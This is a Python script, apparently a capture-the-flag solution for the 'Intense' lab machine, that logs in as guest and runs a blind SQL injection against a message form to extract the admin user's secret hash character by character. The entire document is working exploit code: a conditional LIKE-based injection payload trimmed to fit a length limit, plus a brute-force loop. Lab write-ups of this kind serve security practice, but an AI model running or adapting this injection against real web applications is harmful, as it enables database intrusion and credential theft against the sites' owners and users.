import requests

LoginUrl = 'http://intense.htb/postlogin'
LoginData = {'username':'guest','password':'guest'}
SqlUrl = 'http://intense.htb/submitmessage'
sess = requests.Session()
sess.post(LoginUrl, data=LoginData)
#Only hexadecimals as SHA1 only contains this:
ValidChars = '0123456789abcdef'
#Had to have atleast one char of the hash or it will start with 0...
Hash='f1f'
print("[!] Starting brute-force. Here are the chars!!!")
#The hash was of 65 chars so....
while len(Hash)<65:
	for char in ValidChars:
		#This the SQLi... %Hash[-5] used as the server didn't allow more than 140 chars. This will check if the upcoming char is related with any 5 letters of the hash.
		SqlData = {'message':'\' or (select case when ((select secret from users where username="admin")like \'%'+Hash[-5:]+char+'%\') then \'a\' else match(1,1) end from users))-- -'}
		response = sess.post(SqlUrl,data=SqlData)
		#Very understandabe print statements.
		print("[!] The payload is: "+'%'+Hash[-5:]+char+'%')
		print("[!] The response is: "+response.content.decode())
		if(response.content == b'OK'):
			Hash+=char
			print(Hash)
			continue

print("[+] The hash is: "+Hash)
